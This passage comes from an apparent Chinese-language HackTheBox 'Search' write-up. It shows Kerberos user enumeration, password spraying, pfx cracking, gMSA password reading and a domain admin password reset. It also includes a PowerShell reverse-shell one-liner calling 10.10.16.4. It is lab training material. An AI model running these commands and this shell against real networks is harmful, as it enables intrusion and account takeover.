class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kerbrute userenum -d search.htb ./username.txt --dc 10.10.11.129<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 05/22/22 - Ronnie Flathers @ropnop<br><br>2022/05/22 20:13:03 &gt;  Using KDC(s):<br>2022/05/22 20:13:03 &gt;  10.10.11.129:88<br><br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: abril.suarez@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: chanel.bell@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: cameron.melendez@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: belen.compton@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: angie.duffy@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: antony.russo@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: claudia.pugh@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: cortez.hickman@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: eddie.stevens@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: dax.santiago@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: edith.walls@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: frederick.cuevas@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: hope.sharp@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: edgar.jacobs@search.htb<br>2022/05/22 20:13:03 &gt;  [+] VALID USERNAME: eve.galvan@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: jayla.roberts@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: jordan.gregory@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: sierra.frye@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: savanah.velazquez@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: reginald.morton@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: santino.benjamin@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: payton.harmon@search.htb<br>2022/05/22 20:13:04 &gt;  [+] VALID USERNAME: trace.ryan@search.htb<br>2022/05/22 20:13:04 &gt;  Done! Tested 23 usernames (23 valid) <span class="hljs-keyword">in</span> 0.918 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.129 -u username.txt -p passwd.txt --continue-on-success | grep <span class="hljs-string">&quot;[+]&quot;</span><br>SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby <br>SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? <br></code></pre></td></tr></table></figure><p>它多了些东西，不过是空的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbmap -H 10.10.11.129 -u edgar.jacobs -p @3ONEmillionbaby<br>[+] IP: 10.10.11.129:445Name: search.htb                                        <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>CertEnroll                                        READ ONLYActive Directory Certificate Services share<br>helpdesk                                          READ ONLY<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>RedirectedFolders$                                READ, WRITE<br>SYSVOL                                            READ ONLYLogon server share <br><br>&gt;&gt; smbclient //10.10.11.129/helpdesk -U edgar.jacobs<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\edgar.jacobs]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  Dc        0  Tue Apr 14 18:24:23 2020<br>  ..                                 Dc        0  Tue Apr 14 18:24:23 2020<br><br>3246079 blocks of size 4096. 581884 blocks available<br></code></pre></td></tr></table></figure><p>也无法移动上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; psexec.py -hashes <span class="hljs-string">&#x27;92b9467a379658c07e2341b45a090a3c:92b9467a379658c07e2341b45a090a3c&#x27;</span> <span class="hljs-string">&#x27;search/edgar.jacobs@10.10.11.129&#x27;</span><br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.16.0-unknown is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.12.1-git20200711.33e2d80-dfsg1-0.6 is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Requesting shares on 10.10.11.129.....<br>[-] share <span class="hljs-string">&#x27;ADMIN$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;C$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;CertEnroll&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;helpdesk&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;NETLOGON&#x27;</span> is not writable.<br>[*] Found writable share RedirectedFolders$<br>[*] Uploading file cQzBhSYX.exe<br>[*] Opening SVCManager on 10.10.11.129.....<br>[-] Error opening SVCManager on 10.10.11.129.....<br>[-] Error performing the installation, cleaning up: Unable to open SVCManager<br></code></pre></td></tr></table></figure><p>最后在桌面发现一些东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \edgar.jacobs\Desktop\&gt; <span class="hljs-built_in">ls</span><br>  .                                 DRc        0  Mon Aug 10 18:02:16 2020<br>  ..                                DRc        0  Mon Aug 10 18:02:16 2020<br>  <span class="hljs-variable">$RECYCLE</span>.BIN                     DHSc        0  Fri Apr 10 04:05:29 2020<br>  desktop.ini                      AHSc      282  Mon Aug 10 18:02:16 2020<br>  Microsoft Edge.lnk                 Ac     1450  Fri Apr 10 04:05:03 2020<br>  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 18:35:44 2020<br><br>3246079 blocks of size 4096. 581611 blocks available<br>smb: \edgar.jacobs\Desktop\&gt; get Phishing_Attempt.xlsx <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/wsp.png" alt="img"></p><p>这里看起来像是有个C列，但是我拉不出来，在拉的时候还弹出个提示：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522210713086.png" alt="image-20220522210713086"></p><p>尝试了两个密码。没成功：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522211341107.png" alt="image-20220522211341107"></p><p>我试着在Google搜寻了一番，这种保护它并不是保护数据的，并不对数据进行任何加密，它只是单纯的保护数据不被篡改，我可以把它改成zip格式的，再解压出其中的xml：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522211645781.png" alt="image-20220522211645781"></p><p>在xl\worksheets目录下，会有sheet.xml，它便记录着保护的配置信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522212110509.png" alt="image-20220522212110509"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522212203514.png" alt="image-20220522212203514"></p><p>我可以将其删除，然后将文件重新归档zip再把后缀名改为xlsx：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522212410301.png" alt="image-20220522212410301"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.129 -u username.txt -p passwd.txt --no-bruteforce --continue-on-success | grep <span class="hljs-string">&quot;[+]&quot;</span><br>  <span class="hljs-string">&quot;class&quot;</span>: algorithms.Blowfish,<br>SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE <br>SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE <br>SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$<span class="hljs-variable">$49</span>=wide=STRAIGHT=jordan=28$<span class="hljs-variable">$18</span> <br></code></pre></td></tr></table></figure><p>有一个可以用：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt; smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.129</span> -u Sierra.Frye -p <span class="hljs-string">&#x27;$$49=wide=STRAIGHT=jordan=28$$18&#x27;</span><br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.129</span>:<span class="hljs-number">445</span><span class="hljs-type">Name</span>: <span class="hljs-keyword">search</span>.htb                                        <br>        Disk                                                  Permissions<span class="hljs-keyword">Comment</span><br><span class="hljs-comment">----                                                  ------------------</span><br><span class="hljs-keyword">ADMIN</span>$                                            <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>Remote <span class="hljs-keyword">Admin</span><br>C$                                                <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span><span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>CertEnroll                                        <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Active Directory Certificate Services <span class="hljs-keyword">share</span><br>helpdesk                                          <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span><br>IPC$                                              <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Remote IPC<br>NETLOGON                                          <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>RedirectedFolders$                                <span class="hljs-keyword">READ</span>, <span class="hljs-keyword">WRITE</span><br>SYSVOL                                            <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>                                                                                                   <br></code></pre></td></tr></table></figure><p>还是没什么东西，不过在当前用户的桌面可以看到user.txt：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">smb: \sierra.frye\Desktop\&gt; ls<br>  .                                 DRc       <span class="hljs-number"> 0 </span> Thu Nov<span class="hljs-number"> 18 </span>09:08:00 2021<br>  ..                                DRc       <span class="hljs-number"> 0 </span> Thu Nov<span class="hljs-number"> 18 </span>09:08:00 2021<br>  $RECYCLE.BIN                     DHSc       <span class="hljs-number"> 0 </span> Wed Apr <span class="hljs-number"> 8 </span>02:03:59 2020<br>  desktop.ini                      AHSc     <span class="hljs-number"> 282 </span> Fri Jul<span class="hljs-number"> 31 </span>22:42:15 2020<br>  Microsoft Edge.lnk                 Ac    <span class="hljs-number"> 1450 </span> Tue Apr <span class="hljs-number"> 7 </span>20:28:05 2020<br>  user.txt                           Ac      <span class="hljs-number"> 33 </span> Thu Nov<span class="hljs-number"> 18 </span>08:55:27 2021<br><br>3246079 blocks of size 4096.<span class="hljs-number"> 581346 </span>blocks available<br>smb: \sierra.frye\Desktop\&gt; <br></code></pre></td></tr></table></figure><p>在备份目录中会有一本证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \sierra.frye\Downloads\Backups\&gt; <span class="hljs-built_in">ls</span><br>  .                                 DHc        0  Tue Aug 11 04:39:17 2020<br>  ..                                DHc        0  Tue Aug 11 04:39:17 2020<br>  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 23:04:11 2020<br>  staff.pfx                          Ac     4326  Tue Aug 11 04:39:17 2020<br><br>3246079 blocks of size 4096. 581342 blocks available<br>smb: \sierra.frye\Downloads\Backups\&gt; get staff.pfx <br></code></pre></td></tr></table></figure><p>我想起有些HTTPS服务被403拒绝了，或许可以用证书去试试：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522214534827.png" alt="image-20220522214534827"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; pfx2john staff.pfx &gt; staff.pfx.hash<br>&gt;&gt; john staff.pfx.hash -w=/usr/share/wordlists/rockyou.txt<br>Created directory: /home/mosaic/.john<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (pfx, (.pfx, .p12) [PKCS<span class="hljs-comment">#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])</span><br>Cost 1 (iteration count) is 2000 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>misspissy        (staff.pfx)     <br>1g 0:00:01:46 DONE (2022-05-22 21:48) 0.009372g/s 51401p/s 51401c/s 51401C/s misssnamy..missnono<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522214931601.png" alt="image-20220522214931601"></p><p>会出现个登录框，输入sierra.frye的密码会出现个伪powershell终端：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522220744792.png" alt="image-20220522220744792"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <br><br><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.16.4&quot;</span>,<span class="hljs-number">1337</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<br><br><span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIE<br><br>ncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;PS &quot;</span> + (<span class="hljs-built_in">pwd</span>).Path<br><br> + <span class="hljs-string">&quot;&gt; &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.F<br><br>lush()&#125;;<span class="hljs-variable">$client</span>.Close()<br><br>At line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span><br><br>+ <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.16.4&quot;</span>,<span class="hljs-number">1337</span>); ...<br><br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><br>This script contains malicious content and has been blocked by your antivirus software.<br><br>    + CategoryInfo          : ParserError: (:) [], ParseException <br><br>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent <br><br> <br><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <br></code></pre></td></tr></table></figure><p>有杀软。</p><h4 id="ReadGMSAPassword权限："><a href="#ReadGMSAPassword权限：" class="headerlink" title="ReadGMSAPassword权限："></a>ReadGMSAPassword权限：</h4><p>再进行一次bloodhound可以抓到更多信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522222905512.png" alt="image-20220522222905512"></p><p>我可以先检索COVID.SEARCH.HTB 的密码，然后改掉域管理组用户Tristan.Davies的密码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$gmsa</span> = <span class="hljs-built_in">Get-ADServiceAccount</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;BIR-ADFS-GMSA&#x27;</span> <span class="hljs-literal">-Properties</span> <span class="hljs-string">&#x27;msDS-ManagedPassword&#x27;</span><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$mp</span> = <span class="hljs-variable">$gmsa</span>.<span class="hljs-string">&#x27;msDS-ManagedPassword&#x27;</span><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span><br>Version                   : <span class="hljs-number">1</span><br><br>CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤<br><br>                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇<br><br>SecureCurrentPassword     : System.Security.SecureString<br>PreviousPassword          : <br>SecurePreviousPassword    : <br>QueryPasswordInterval     : <span class="hljs-number">2876.09</span>:<span class="hljs-number">21</span>:<span class="hljs-number">31.4918812</span><br>UnchangedPasswordInterval : <span class="hljs-number">2876.09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">31.4918812</span><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <br></code></pre></td></tr></table></figure><p>将它保存到一个变量里：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).CurrentPassword<br><br>ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱<br><br>茾蒚⟒澽座걍盡篇<br><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$password</span> = (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).CurrentPassword<br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$SecPass</span> = (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).SecureCurrentPassword<br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <br></code></pre></td></tr></table></figure><p>重置tristan.davies账户密码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).CurrentPassword<br><br>ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱<br><br>茾蒚⟒澽座걍盡篇<br><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$password</span> = (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).CurrentPassword<br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$SecPass</span> = (<span class="hljs-built_in">ConvertFrom-ADManagedPasswordBlob</span> <span class="hljs-variable">$mp</span>).SecureCurrentPassword<br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential BIR<span class="hljs-literal">-ADFS-GMSA</span>, <span class="hljs-variable">$SecPass</span><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> tristan.davies <span class="hljs-literal">-reset</span> <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-string">&#x27;whoamiWHOAMI!&#x27;</span> <span class="hljs-literal">-force</span>)&#125; <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><span class="hljs-built_in">PS</span> C:\Users\Sierra.Frye\Documents&gt; <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;&gt; crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">11.129</span> <span class="hljs-literal">-u</span> tristan.davies <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;whoamiWHOAMI!&#x27;</span><br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">11.129</span>    <span class="hljs-number">445</span>    RESEARCH         [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">11.129</span>    <span class="hljs-number">445</span>    RESEARCH         [+] search.htb\tristan.davies:whoamiWHOAMI! (Pwn3d!<br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bat">&gt;&gt; wmiexec.py &#x27;search/tristan.davies:whoamiWHOAMI!@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">129</span>&#x27; <br>Impacket v0.<span class="hljs-number">10</span>.<span class="hljs-number">0</span> - Copyright <span class="hljs-number">2022</span> SecureAuth Corporation<br><br>[*] SMBv3.<span 